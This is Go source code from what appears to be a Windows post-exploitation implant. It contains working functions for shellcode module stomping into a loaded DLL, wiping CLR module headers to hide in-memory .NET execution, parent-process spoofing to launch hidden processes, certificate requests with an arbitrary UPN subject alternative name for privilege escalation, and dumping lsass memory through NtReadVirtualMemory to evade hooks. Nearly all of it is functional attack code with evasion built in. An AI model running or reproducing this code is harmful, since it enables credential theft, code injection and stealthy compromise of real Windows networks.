var procGetLogicalDriveStringsW = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetLogicalDriveStringsW")

// listDrivesJSON returns available Windows drive letters in LS_JSON format.
func listDrivesJSON() (string, error) {
	buf := make([]uint16, 256)
	ret, _, err := procGetLogicalDriveStringsW.Call(
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&buf[0])),
	)
	if ret == 0 {
		return "", fmt.Errorf("GetLogicalDriveStrings: %w", err)
	}
	type fsEntry struct {
		Name  string `json:"name"`
		IsDir bool   `json:"is_dir"`
		Size  int64  `json:"size"`
		Mod   string `json:"mod"`
	}
	var entries []fsEntry
	for i := 0; i < len(buf); {
		if buf[i] == 0 {
			break
		}
		j := i
		for j < len(buf) && buf[j] != 0 {
			j++
		}
		drive := windows.UTF16ToString(buf[i:j])
		entries = append(entries, fsEntry{Name: drive, IsDir: true})
		i = j + 1
	}
	data, err := json.Marshal(map[string]interface{}{
		"cwd": "", "path": "", "drives": true, "entries": entries,
	})
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// netSharesJSON lists SMB shares on a remote host using 'net view' and returns in LS_JSON format.
func netSharesJSON(host string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	out, _ := exec.CommandContext(ctx, "net", "view", "\\\\"+host, "/all").CombinedOutput()

	type fsEntry struct {
		Name  string `json:"name"`
		IsDir bool   `json:"is_dir"`
		Size  int64  `json:"size"`
		Mod   string `json:"mod"`
	}
	lines := strings.Split(string(out), "\n")
	var entries []fsEntry
	parsing := false
	for _, line := range lines {
		line = strings.TrimRight(line, "\r\n ")
		if strings.Contains(line, "---") {
			parsing = true
			continue
		}
		if !parsing || line == "" {
			continue
		}
		lower := strings.ToLower(line)
		if strings.Contains(lower, "command completed") || strings.Contains(lower, "comando completado") {
			break
		}
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		shareType := strings.ToLower(fields[1])
		if shareType == "disk" || shareType == "disco" || shareType == "datenträger" {
			entries = append(entries, fsEntry{Name: fields[0], IsDir: true})
		}
	}
	data, err := json.Marshal(map[string]interface{}{
		"cwd": "", "path": "\\\\" + host, "shares": true, "entries": entries,
	})
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// ── SHELLCODE_STOMP ───────────────────────────────────────────────────────────
//
// Overwrites the .text section of an already-loaded DLL with shellcode.
// Args JSON: {"dll":"<name>","sc_b64":"<base64>"} — dll defaults to auto-pick.
// Unlike UDRL (which creates a new SEC_IMAGE section), this reuses an existing
// mapped image region; from the VAD it is indistinguishable from normal DLL code.

func shellcodeStomp(sc []byte, dllHint string) string {
	if len(sc) == 0 {
		return "[-] shellcode_stomp: empty shellcode"
	}

	// Candidates to auto-pick when no hint given (small, rarely-called DLLs)
	autoTargets := []string{
		"xpsservices.dll", "clbcatq.dll", "msasn1.dll",
		"wbemprox.dll", "wbemcomn.dll",
	}

	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, 0)
	if err != nil {
		return "[-] shellcode_stomp: CreateToolhelp32Snapshot: " + err.Error()
	}
	defer windows.CloseHandle(snap)

	var me windows.ModuleEntry32
	me.Size = uint32(unsafe.Sizeof(me))

	var targetBase uintptr
	var targetName string

	for windows.Module32First(snap, &me) == nil {
		name := strings.ToLower(windows.UTF16ToString(me.Module[:]))
		pick := false
		if dllHint != "" {
			pick = strings.EqualFold(name, strings.ToLower(dllHint))
		} else {
			for _, t := range autoTargets {
				if name == t {
					pick = true
					break
				}
			}
		}
		if pick {
			targetBase = me.ModBaseAddr
			targetName = name
			break
		}
		if windows.Module32Next(snap, &me) != nil {
			break
		}
	}

	if targetBase == 0 {
		return "[-] shellcode_stomp: target DLL not loaded in process"
	}

	// Parse PE to find .text section
	dosHdr := (*[2]byte)(unsafe.Pointer(targetBase))
	if dosHdr[0] != 'M' || dosHdr[1] != 'Z' {
		return "[-] shellcode_stomp: DLL MZ already wiped, can't parse PE"
	}
	e_lfanew := *(*uint32)(unsafe.Pointer(targetBase + 0x3C))
	ntBase := targetBase + uintptr(e_lfanew)
	numSections := *(*uint16)(unsafe.Pointer(ntBase + 6))
	optHdrSize := *(*uint16)(unsafe.Pointer(ntBase + 20))
	sectBase := ntBase + 24 + uintptr(optHdrSize)

	var textOff, textSize uintptr
	for i := uintptr(0); i < uintptr(numSections); i++ {
		s := sectBase + i*40
		name8 := (*[8]byte)(unsafe.Pointer(s))
		secName := strings.TrimRight(string(name8[:]), "\x00")
		if secName == ".text" {
			textOff = uintptr(*(*uint32)(unsafe.Pointer(s + 12)))  // VirtualAddress
			textSize = uintptr(*(*uint32)(unsafe.Pointer(s + 16))) // VirtualSize
			break
		}
	}
	if textSize == 0 {
		return "[-] shellcode_stomp: no .text section found in " + targetName
	}

	writeAddr := targetBase + textOff
	writeLen := uintptr(len(sc))
	if writeLen > textSize {
		writeLen = textSize
	}

	var old uint32
	apiVirtualProtect(writeAddr, writeLen, windows.PAGE_READWRITE, uintptr(unsafe.Pointer(&old)))
	copy(unsafe.Slice((*byte)(unsafe.Pointer(writeAddr)), writeLen), sc[:writeLen])
	apiVirtualProtect(writeAddr, writeLen, windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&old)))

	// Execute from stomped region
	if th, err := hgCreateThreadEx(windows.CurrentProcess(), writeAddr, 0); err == nil {
		windows.CloseHandle(th)
	} else {
		r, _, _ := procCreateThread.Call(0, 0, writeAddr, 0, 0, 0)
		if r == 0 {
			return fmt.Sprintf("[-] shellcode_stomp: CreateThread failed: %v", err)
		}
		windows.CloseHandle(windows.Handle(r))
	}
	return fmt.Sprintf("[+] shellcode_stomp: %s+0x%x sc=%d B → executing", targetName, textOff, len(sc))
}

// ── CLR_STOMP ─────────────────────────────────────────────────────────────────

// clrStomp zeroes the MZ header of every loaded CLR/mscor module in-process.
// Returns a message with the count of modules stomped.
func clrStomp() string {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, 0)
	if err != nil {
		return "[-] CreateToolhelp32Snapshot: " + err.Error()
	}
	defer windows.CloseHandle(snap)

	var me windows.ModuleEntry32
	me.Size = uint32(unsafe.Sizeof(me))
	stomped := 0

	for windows.Module32First(snap, &me) == nil {
		name := strings.ToLower(windows.UTF16ToString(me.Module[:]))
		if strings.Contains(name, "clr") || strings.Contains(name, "mscor") {
			base := (*byte)(unsafe.Pointer(me.ModBaseAddr))
			if base != nil && *base == 0x4D { // 'M'
				var old uint32
				apiVirtualProtect(me.ModBaseAddr, 2, windows.PAGE_READWRITE, uintptr(unsafe.Pointer(&old)))
				*base = 0
				*(*byte)(unsafe.Pointer(me.ModBaseAddr + 1)) = 0
				apiVirtualProtect(me.ModBaseAddr, 2, uintptr(old), uintptr(unsafe.Pointer(&old)))
				stomped++
			}
		}
		if windows.Module32Next(snap, &me) != nil {
			break
		}
	}
	return fmt.Sprintf("[+] stomped %d CLR module header(s)", stomped)
}

// ── PPID spoof (spawn with custom parent) ────────────────────────────────────

// spawnWithPPID spawns cmd with its Win32 PPID set to the first process
// matching parent (default: explorer.exe). Returns a status string.
func spawnWithPPID(cmd, parent string) string {
	if parent == "" {
		parent = "explorer.exe"
	}
	if cmd == "" {
		cmd = "cmd.exe"
	}
	parentPID := findProcessByName(parent)
	if parentPID == 0 {
		return fmt.Sprintf("[-] parent process '%s' not found", parent)
	}
	parentH, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, parentPID)
	if err != nil {
		return fmt.Sprintf("[-] OpenProcess(%s): %v", parent, err)
	}
	defer windows.CloseHandle(parentH)

	var attrListSize uintptr
	procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))
	attrList := make([]byte, attrListSize)
	r, _, _ := procInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(&attrList[0])), 1, 0,
		uintptr(unsafe.Pointer(&attrListSize)),
	)
	if r == 0 {
		return "[-] InitializeProcThreadAttributeList failed"
	}
	defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])))

	r, _, _ = procUpdateProcThreadAttribute.Call(
		uintptr(unsafe.Pointer(&attrList[0])), 0,
		uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
		uintptr(unsafe.Pointer(&parentH)),
		unsafe.Sizeof(parentH), 0, 0,
	)
	if r == 0 {
		return "[-] UpdateProcThreadAttribute failed"
	}

	type startupInfoEx struct {
		si      windows.StartupInfo
		attrPtr uintptr
	}
	siEx := startupInfoEx{}
	siEx.si.Cb = uint32(unsafe.Sizeof(siEx))
	siEx.si.Flags = windows.STARTF_USESHOWWINDOW
	siEx.si.ShowWindow = 0
	siEx.attrPtr = uintptr(unsafe.Pointer(&attrList[0]))

	var pi windows.ProcessInformation
	cmdW, _ := windows.UTF16PtrFromString(cmd)
	const EXTENDED_STARTUPINFO_PRESENT = 0x00080000
	err = windows.CreateProcess(
		nil, cmdW, nil, nil, false,
		windows.CREATE_NEW_CONSOLE|EXTENDED_STARTUPINFO_PRESENT,
		nil, nil, &siEx.si, &pi,
	)
	if err != nil {
		return fmt.Sprintf("[-] CreateProcess: %v", err)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return fmt.Sprintf("[+] spawned '%s' (PID %d) with PPID=%s", cmd, pi.ProcessId, parent)
}

func adcsRequest(ca, tmpl, subj, san, outPath string) string {
	pid := os.Getpid()
	inf := fmt.Sprintf(`C:\Users\Public\adcs_%d.inf`, pid)
	csr := fmt.Sprintf(`C:\Users\Public\adcs_%d.csr`, pid)
	if outPath == "" {
		outPath = fmt.Sprintf(`C:\Users\Public\adcs_%d.cer`, pid)
	}
	sanLine := ""
	if san != "" {
		sanLine = "\r\nSAN=upn=" + san
	}
	infContent := fmt.Sprintf(
		"[Version]\r\nSignature=\"$Windows NT$\"\r\n\r\n[NewRequest]\r\nSubject = \"%s\"\r\nKeySpec = 1\r\nKeyLength = 2048\r\nExportable = TRUE\r\nMachineKeySet = FALSE\r\nRequestType = CMC\r\n\r\n[RequestAttributes]\r\nCertificateTemplate=%s%s\r\n",
		subj, tmpl, sanLine)
	_ = os.WriteFile(inf, []byte(infContent), 0600)
	out1, _ := runShell(fmt.Sprintf(`certreq -new "%s" "%s" 2>&1`, inf, csr))
	out2, _ := runShell(fmt.Sprintf(`certreq -submit -config "%s" "%s" "%s" 2>&1`, ca, csr, outPath))
	certB64 := ""
	if cert, err := os.ReadFile(outPath); err == nil {
		certB64 = "\ncert_b64=" + base64.StdEncoding.EncodeToString(cert)
	}
	_ = os.Remove(inf)
	_ = os.Remove(csr)
	return out1 + "\n" + out2 + certB64
}

// lsassDumpNT reads lsass memory via NtReadVirtualMemory (avoids ReadProcessMemory hooks)
// and builds a minimal valid MDMP (SystemInfoStream + ModuleListStream + Memory64ListStream).
func lsassDumpNT(lsassPid uint32) ([]byte, error) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntReadVM := ntdll.NewProc("NtReadVirtualMemory")

	// detect real OS version via RtlGetVersion (bypasses GetVersionEx compat shim)
	type osversioninfow struct {
		dwOSVersionInfoSize uint32
		dwMajorVersion      uint32
		dwMinorVersion      uint32
		dwBuildNumber       uint32
		dwPlatformId        uint32
		szCSDVersion        [128]uint16
	}
	var osvi osversioninfow
	osvi.dwOSVersionInfoSize = uint32(unsafe.Sizeof(osvi))
	rtlGetVersion := ntdll.NewProc("RtlGetVersion")
	rtlGetVersion.Call(uintptr(unsafe.Pointer(&osvi)))
	osMajor := osvi.dwMajorVersion
	if osMajor == 0 { osMajor = 10 }
	osMinor := osvi.dwMinorVersion
	osBuild := osvi.dwBuildNumber
	if osBuild == 0 { osBuild = 19041 }

	if lsassPid == 0 {
		lsassPid = findProcessPID("lsass.exe")
		if lsassPid == 0 {
			return nil, fmt.Errorf("lsass.exe not found")
		}
	}
	hProc, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, lsassPid)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess: %v", err)
	}
	defer windows.CloseHandle(hProc)

	// ── modules ───────────────────────────────────────────────────────────────
	type modInfo struct{ base uint64; size uint32; name string }
	var mods []modInfo
	snap, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, lsassPid)
	if snap != windows.InvalidHandle {
		var me windows.ModuleEntry32
		me.Size = uint32(unsafe.Sizeof(me))
		if windows.Module32First(snap, &me) == nil {
			for {
				mods = append(mods, modInfo{
					uint64(me.ModBaseAddr), me.ModBaseSize,
					windows.UTF16ToString(me.Module[:]),
				})
				if windows.Module32Next(snap, &me) != nil {
					break
				}
			}
		}
		windows.CloseHandle(snap)
	}

	// ── memory regions ────────────────────────────────────────────────────────
	type memReg struct{ addr, size uint64; data []byte }
	var regs []memReg
	var cur uintptr
	for {
		var mbi windows.MemoryBasicInformation
		if err := windows.VirtualQueryEx(hProc, cur, &mbi, unsafe.Sizeof(mbi)); err != nil {
			break
		}
		if mbi.State == windows.MEM_COMMIT {
			rbuf := make([]byte, mbi.RegionSize)
			var nRead uintptr
			ntReadVM.Call(uintptr(hProc), uintptr(mbi.BaseAddress),
				uintptr(unsafe.Pointer(&rbuf[0])), uintptr(mbi.RegionSize),
				uintptr(unsafe.Pointer(&nRead)))
			if nRead > 0 {
				regs = append(regs, memReg{uint64(mbi.BaseAddress), uint64(nRead), rbuf[:nRead]})
			}
		}
		next := uintptr(mbi.BaseAddress) + mbi.RegionSize
		if next <= cur {
			break
		}
		cur = next
	}

	// ── build MDMP ────────────────────────────────────────────────────────────
	pu32 := binary.LittleEndian.PutUint32
	pu64 := binary.LittleEndian.PutUint64
	pu16 := binary.LittleEndian.PutUint16

	// Layout:
	//  0:   MINIDUMP_HEADER (32)
	//  32:  MINIDUMP_DIRECTORY * 3 (36)
	//  68:  SystemInfoStream (62 = 56 struct + 6 empty MINIDUMP_STRING for CSDVersionRva)
	//  130: ModuleListStream = 4 + N*108 bytes + name blobs
	//  X:   Memory64ListStream = 8+8+N*16 bytes
	//  Y:   raw memory data
	const (
		modEntSz   = 108
		sysInfoSz  = 62 // 56-byte struct + 6 zero bytes (empty MINIDUMP_STRING for CSDVersionRva)
		numStreams  = 3
	)
	dirOff     := 32
	sysInfoOff := dirOff + numStreams*12 // 32+36=68
	modListOff := sysInfoOff + sysInfoSz // 68+56=124

	// build module name blobs (MINIDUMP_STRING = ULONG32 len_bytes + UTF-16 + null)
	type nameBlob struct{ rva int; data []byte }
	names := make([]nameBlob, len(mods))
	nameOff := modListOff + 4 + len(mods)*modEntSz
	for i, m := range mods {
		u16 := append(utf16.Encode([]rune(m.name)), 0) // null-terminate
		blob := make([]byte, 4+len(u16)*2)
		binary.LittleEndian.PutUint32(blob, uint32(len(u16)*2-2)) // length excl null
		for j, ch := range u16 {
			binary.LittleEndian.PutUint16(blob[4+j*2:], ch)
		}
		names[i] = nameBlob{nameOff, blob}
		nameOff += len(blob)
	}

	mem64Off    := nameOff
	mem64HdrLen := 8 + 8 + len(regs)*16
	dataOff     := mem64Off + mem64HdrLen
	totalData   := 0
	for _, r := range regs { totalData += int(r.size) }

	buf := make([]byte, dataOff+totalData)

	// MINIDUMP_HEADER
	pu32(buf[0:], 0x504d444d)
	pu32(buf[4:], 0x0000a793)
	pu32(buf[8:], numStreams)
	pu32(buf[12:], uint32(dirOff))
	pu32(buf[16:], 0)
	pu32(buf[20:], uint32(time.Now().Unix()))
	pu64(buf[24:], 2) // MiniDumpWithFullMemory

	// directories
	pu32(buf[dirOff:], 7); pu32(buf[dirOff+4:], sysInfoSz); pu32(buf[dirOff+8:], uint32(sysInfoOff))
	modDataLen := uint32(mem64Off - modListOff)
	pu32(buf[dirOff+12:], 4); pu32(buf[dirOff+16:], modDataLen); pu32(buf[dirOff+20:], uint32(modListOff))
	pu32(buf[dirOff+24:], 9); pu32(buf[dirOff+28:], uint32(mem64HdrLen)); pu32(buf[dirOff+32:], uint32(mem64Off))

	// SystemInfo
	si := buf[sysInfoOff:]
	pu16(si[0:], 9); pu16(si[2:], 6)                     // ProcessorArchitecture=AMD64, Level=6
	si[6] = 1; si[7] = 1                                  // NumProcs=1, ProductType=Workstation
	pu32(si[8:], osMajor); pu32(si[12:], osMinor)         // MajorVersion, MinorVersion
	pu32(si[16:], osBuild); pu32(si[20:], 2)              // BuildNumber, PlatformId=NT
	// CSDVersionRva → 6-byte empty MINIDUMP_STRING at sysInfoOff+56 (already zeroed)
	pu32(si[24:], uint32(sysInfoOff+56))

	// ModuleList
	ml := buf[modListOff:]
	pu32(ml[0:], uint32(len(mods)))
	for i, m := range mods {
		e := ml[4+i*modEntSz:]
		pu64(e[0:], m.base)
		pu32(e[8:], m.size)
		pu32(e[20:], uint32(names[i].rva)) // ModuleNameRva
	}
	for _, nb := range names {
		copy(buf[nb.rva:], nb.data)
	}

	// Memory64List
	m64 := buf[mem64Off:]
	pu64(m64[0:], uint64(len(regs)))
	pu64(m64[8:], uint64(dataOff))
	for i, r := range regs {
		e := m64[16+i*16:]
		pu64(e[0:], r.addr); pu64(e[8:], r.size)
	}

	// raw data
	pos := dataOff
	for _, r := range regs {
		copy(buf[pos:], r.data)
		pos += int(r.size)
	}

	return buf, nil
}
